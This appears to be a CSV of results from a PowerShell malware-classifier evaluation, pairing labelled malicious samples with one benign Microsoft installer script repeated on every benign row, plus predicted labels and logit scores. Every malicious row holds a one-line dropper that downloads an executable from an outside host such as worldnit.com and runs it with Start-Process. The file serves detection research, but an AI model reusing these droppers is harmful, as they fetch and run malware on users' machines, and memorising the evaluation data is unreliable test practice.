filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,pair_strategy,correct,predicted_label,logit_diff
527.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,116,116,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kele.exe','fleeb.exe');Start-Process 'fleeb.exe'",21,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,8.3046875
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",22,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/3bdbacef19e6f70b3bf22ba0e82a4b828b22f124ac9e7781ea1ab8b1e8111850.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,116,116,False,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','fleeble.exe');Start-Process 'fleeble.exe'",22,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,6.984375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",23,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
1417.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,117,117,False,"(New-Object System.Net.WebClient).DownloadFile('https://megadl.fr/?b5r5bstqd1','fleeb.exe');Start-Process 'fleeb.exe'",23,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.34375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",24,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
765.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,117,117,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/abacoss.exe','mess.exe');Start-Process 'mess.exe'",24,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.78125
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",25,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/8c157e6e3ec424e585e53ae41ce6e13cd313e73f1891cd992b3ea7eeb866bad5.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,118,118,False,"(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'",25,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,5.296875
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",26,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
2770.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,119,119,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/com.exe','fleeble.exe');Start-Process 'fleeble.exe'",26,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.109375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",27,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/21d04d37dfb4551f54607a3532d6c0d5f46ec52c20ae6db78eb8a4f904a42994.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,119,119,False,"(New-Object System.Net.WebClient).DownloadFile('http://danhviet.com.vn/app/p2.exe','mess.exe');Start-Process 'mess.exe'",27,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,3.0625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",28,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/fc04cb621163954fa0f60dfaec9b07b3c9c6a20600609940d59c8a3ef1684e87.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,119,119,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/aba.exe','fleeble.exe');Start-Process 'fleeble.exe'",28,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.71875
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",29,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
2103.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,120,120,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/comu.exe','fleeble.exe');Start-Process 'fleeble.exe'",29,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.046875
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",30,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
3778.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,120,120,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/sect.exe','fleeble.exe');Start-Process 'fleeble.exe'",30,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.90625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",31,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/4afbe15a7453deb54b263466abdb0b3978eec9bc68bb48f2c6f02104b1dd4e6b.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,120,120,False,"(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'",31,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,4.234375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",32,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
fa2y/malicious_samples/eb0b8f27cf64698d40167593c0be5cc7dcb3c2dec4da0ab086632832964c736f.ps1,malicious,fa2y:malicious_samples,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,120,120,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/pony.exe','fleeble.exe');Start-Process 'fleeble.exe'",32,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,8.484375
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",33,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
1183.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,121,121,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'",33,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,9.25
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",34,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
1478.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,121,121,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/opera.exe','fleeble.exe');Start-Process 'fleeble.exe'",34,malicious,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,malicious,6.765625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",35,benign,DownloadFile,rotate_same_family_benign_one_pair_per_malicious,True,benign,-1.453125
